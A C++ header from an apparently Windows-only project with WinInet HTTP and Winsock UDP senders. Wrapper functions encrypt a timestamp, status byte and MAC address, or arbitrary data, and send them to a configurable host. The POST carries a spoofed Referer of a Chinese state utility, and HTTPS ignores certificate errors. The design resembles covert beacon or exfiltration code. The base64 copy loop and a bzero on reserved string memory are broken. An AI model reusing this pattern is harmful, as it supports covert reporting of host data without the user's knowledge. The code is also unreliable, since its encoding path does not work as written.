#ifndef CPL_NETWORK_HPP_FLICKER_MIGHTY_BLOSSOM_GLIDE_RHYTHM_PULSE_TURBULENCE_ECHO
#define CPL_NETWORK_HPP_FLICKER_MIGHTY_BLOSSOM_GLIDE_RHYTHM_PULSE_TURBULENCE_ECHO

#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <string>

#include "api.hpp"
#include "crypto.hpp"
#include "../../ccl/vendor/codec/base64.h"

using namespace std;

namespace cpl {
    namespace win32 {
        namespace display {
            inline INT32 DumpBase64(string &out, const void *ptr, const size_t size) {
                // todo
                goto __FREE__;
            __ERROR__:
                PASS;
            __FREE__:

                return ERROR_SUCCESS;
            }
            //
            // inline INT32 Dump$IP_ADAPTER_INFO$JSON(string &out, const IP_ADAPTER_INFO *ip_adapter_info) {
            //     // todo
            //     return ERROR_SUCCESS;
            // }
            //
            // inline INT32 Dump$IP_ADAPTER_INFOs$JSON(string &out, const IP_ADAPTER_INFO *ip_adapter_info) {
            //     // todo
            //     return ERROR_SUCCESS;
            // }
            //
            // inline INT32 Dump$MIB_IPFORWARDROW$JSON(string &out, const MIB_IPFORWARDROW *route4) {
            //     // todo
            //     return ERROR_SUCCESS;
            // }
            //
            // inline INT32 Dump$MIB_IPFORWARDTABLE$JSON(string &out, const MIB_IPFORWARDTABLE *route4) {
            //     // todo
            //     return ERROR_SUCCESS;
            // }
            //
            // inline INT32 Dump$MIB_IPFORWARD_ROW2$JSON(string &out, const api::ipv6::MIB_IPFORWARD_ROW2 *route4) {
            //     // todo
            //     return ERROR_SUCCESS;
            // }
            //
            // inline INT32 Dump$MIB_IPFORWARD_TABLE2$JSON(string &out, const api::ipv6::MIB_IPFORWARD_TABLE2 *route4) {
            //     // todo
            //     return ERROR_SUCCESS;
            // }
        }

        namespace network {
            inline INT32 SendHTTP(
                _Out_ string &out,
                _In_ const string &host,
                _In_ const UINT16 port,
                _In_ const string &httpMethod,
                _In_ const string &httpRequestURL,
                _In_ const string &httpReferer,
                _In_ const string &data,
                _In_ const BOOL https
            ) {
                INT32 retCode = ERROR_SUCCESS;
                const auto &api = api::API::Instance();
                HINTERNET hInternetOpen = nullptr, hInternetConnect = nullptr, hHttpOpenRequest = nullptr; {
                    hInternetOpen = api.INet.InternetOpenA(
                        "",
                        INTERNET_OPEN_TYPE_DIRECT,
                        nullptr,
                        nullptr,
                        0
                        //                INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
                    );
                    if (nullptr == hInternetOpen) {
                        const DWORD e = GetLastError();
                        retCode = static_cast<INT32>(e);
                        log_error("[x] InternetOpen failed: [%lu] %s", e, FormatError(e).data());
                        goto __ERROR__;
                    }
                } {
                    hInternetConnect = api.INet.InternetConnectA(
                        hInternetOpen,
                        host.data(),
                        port,
                        "",
                        "",
                        INTERNET_SERVICE_HTTP,
                        0,
                        0
                    );
                    if (nullptr == hInternetConnect) {
                        const DWORD e = GetLastError();
                        retCode = static_cast<INT32>(e);
                        log_error("[x] InternetConnect failed: [%lu] %s", e, FormatError(e).data());
                        goto __ERROR__;
                    }
                } {
                    const DWORD flag = https
                                           ? INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                                             INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
                                           : 0;
                    hHttpOpenRequest = api.INet.HttpOpenRequestA(
                        hInternetConnect,
                        httpMethod.data(),
                        httpRequestURL.data(),
                        "HTTP/1.1",
                        httpReferer.data(),
                        nullptr,
                        flag,
                        0
                    );
                    if (nullptr == hHttpOpenRequest) {
                        const DWORD e = GetLastError();
                        retCode = static_cast<INT32>(e);
                        log_error("[x] HttpOpenRequest failed: [%lu] %s", e, FormatError(e).data());
                        goto __ERROR__;
                    }
                } {
                    /**
                     * 此处使用https发送的话，在WIN XP下会遇到12029的错误，需要勾选IE配置中支持TLS1.2的选项。
                     * 因此暂时不考虑使用https了。
                    */
                    LPVOID p = nullptr;
                    const auto pd = data.data();
                    memmove(&p, &pd, sizeof(LPVOID));
                    const BOOL bRet = api.INet.HttpSendRequestA(
                        hHttpOpenRequest,
                        nullptr,
                        -1,
                        p,
                        data.length()
                    );
                    if (!bRet) {
                        const DWORD e = GetLastError();
                        retCode = static_cast<INT32>(e);
                        log_error("[x] HttpSendRequest failed: [%lu] %s", e, FormatError(e).data());
                        goto __ERROR__;
                    }
                } {
                    BYTE buffer[BUFSIZ];
                    out.clear();
                    while (true) {
                        DWORD dwBytesRead = BUFSIZ;
                        bzero(buffer, sizeof(buffer));

                        const BOOL bRead = api.INet.InternetReadFile(
                            hHttpOpenRequest,
                            buffer,
                            BUFSIZ - 1,
                            &dwBytesRead);

                        if (dwBytesRead == 0) { break; }

                        if (!bRead) {
                            const DWORD e = GetLastError();
                            retCode = static_cast<INT32>(e);
                            log_error("[x] InternetReadFile failed: [%lu] %s", e, FormatError(e).data());
                            goto __ERROR__;
                        } else {
                            buffer[dwBytesRead] = 0;
                            PCTSTR _$p = nullptr;
                            memmove(&_$p, &buffer, sizeof(PCTSTR));
                            out.append(_$p, dwBytesRead);
                        }
                    }
                }

                goto __FREE__;
            __ERROR__:
                PASS;
            __FREE__:
                if (nullptr != hHttpOpenRequest) {
                    api.INet.InternetCloseHandle(hHttpOpenRequest);
                    hHttpOpenRequest = nullptr;
                }
                if (nullptr != hInternetConnect) {
                    api.INet.InternetCloseHandle(hInternetConnect);
                    hInternetConnect = nullptr;
                }
                if (nullptr != hInternetOpen) {
                    api.INet.InternetCloseHandle(hInternetOpen);
                    hInternetOpen = nullptr;
                }
                return retCode;
            }

            inline INT32 SendUDP(
                // _Out_ string& out,
                _In_ const string &host,
                _In_ const UINT16 port,
                _In_ const string &data
            ) {
                INT32 retCode = ERROR_SUCCESS;

                const auto &p_data = data.data();
                const auto len = static_cast<int>(data.length());

                const auto &api = api::API::Instance();

                // int iRet;
                WSADATA wsaData{};
                SOCKADDR *psa = nullptr;

                auto SendSocket = INVALID_SOCKET;
                sockaddr_in rcvAddr{};

                // char SendBuf[2] = "H";
                // int BufLen = 2;

                //----------------------
                // Initialize Winsock
                int iRet = api.WS32.WSAStartup(MAKEWORD(2, 2), &wsaData);
                if (iRet != NO_ERROR) {
                    const int e = api.WS32.WSAGetLastError();
                    retCode = e;
                    log_error("[x] WSAStartup failed %d: %s", iRet, FormatError(e).data());
                    goto __ERROR__;
                }

                //---------------------------------------------
                // Create a socket for sending data
                SendSocket = api.WS32.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if (SendSocket == INVALID_SOCKET) {
                    const int e = api.WS32.WSAGetLastError();
                    retCode = e;
                    log_error("[x] socket failed %d: %s", iRet, FormatError(e).data());
                    goto __ERROR__;
                }
                //---------------------------------------------
                // Set up the RecvAddr structure with the IP address of
                // the receiver (in this example case "192.168.1.1")
                // and the specified port number.
                rcvAddr.sin_family = AF_INET;
                rcvAddr.sin_port = api.WS32.htons(port);
                rcvAddr.sin_addr.s_addr = api.WS32.inet_addr(host.data());


                psa = reinterpret_cast<SOCKADDR *>(&rcvAddr);

                iRet = api.WS32.sendto(SendSocket,
                                       p_data,
                                       len,
                                       0,
                                       psa,
                                       sizeof (rcvAddr));

                if (iRet == SOCKET_ERROR) {
                    const int e = api.WS32.WSAGetLastError();
                    retCode = e;
                    log_error("[x] sendto failed %d: %s", iRet, FormatError(e).data());
                    goto __ERROR__;
                }
                goto __FREE__;
            __ERROR__:
                PASS;
            __FREE__:
                if (INVALID_SOCKET != SendSocket) {
                    iRet = api.WS32.closesocket(SendSocket);
                    if (iRet == SOCKET_ERROR) {
                        const int e = api.WS32.WSAGetLastError();
                        retCode = e;
                        log_error("[x] closesocket failed %d: %s", iRet, FormatError(e).data());
                    }
                }
                api.WS32.WSACleanup();
                return retCode;
            }

            namespace wrapper {
                inline INT32 SendTo(
                    const string &host,
                    const UINT16 port,
                    const string &secret,
                    const BYTE status,
                    const string &mac
                ) {
                    // 通信格式：timestamp, status, mac

                    INT32 retCode = ERROR_SUCCESS;
                    string data{};
                    const auto timestamp = time(nullptr);
                    const auto p0 = &timestamp;
                    char *p{};
                    memmove(&p, &p0, sizeof(PVOID));
                    for (auto i = 0; i < sizeof(time_t); i++) {
                        data.push_back(p[i]);
                    }
                    data.push_back(static_cast<char>(status));
                    data += mac;
                    string enc{};
                    retCode |= crypto::Win32Crypto.Encrypt(
                        secret,
                        data,
                        enc
                    );
                    retCode |= network::SendUDP(
                        host,
                        port,
                        enc
                    );
                    return retCode;
                }

                inline INT32 Post(
                    const string &host,
                    const UINT16 port,
                    const string &secret,
                    const string &data
                ) {
                    INT32 retCode = ERROR_SUCCESS;
                    string enc{};
                    retCode |= crypto::Win32Crypto.Encrypt(
                        secret,
                        data,
                        enc
                    );
                    string b64enc{};
                    b64enc.reserve(enc.size() * 2 + 16);
                    bzero(&b64enc[0], enc.size() * 2 + 16);
                    auto *pc = b64enc.data() + 2;
                    char *p{};
                    memmove(&p, &pc, sizeof(PVOID));
                    Codec$$$UrlSafeBase64Encode(enc.data(), enc.length(), p);
                    while (!*p) {
                        b64enc.push_back(*p);
                        p++;
                    }
                    string response{};
                    retCode |= network::SendHTTP(
                        response,
                        host,
                        port,
                        "POST",
                        "/",
                        "https://www.sgcc.com.cn/",
                        b64enc,
                        false
                    );
                    log_info("[%d] POST response: %s", retCode, response.data());
                    return retCode;
                }
            }
        }
    }
}

#endif //CPL_NETWORK_HPP_FLICKER_MIGHTY_BLOSSOM_GLIDE_RHYTHM_PULSE_TURBULENCE_ECHO
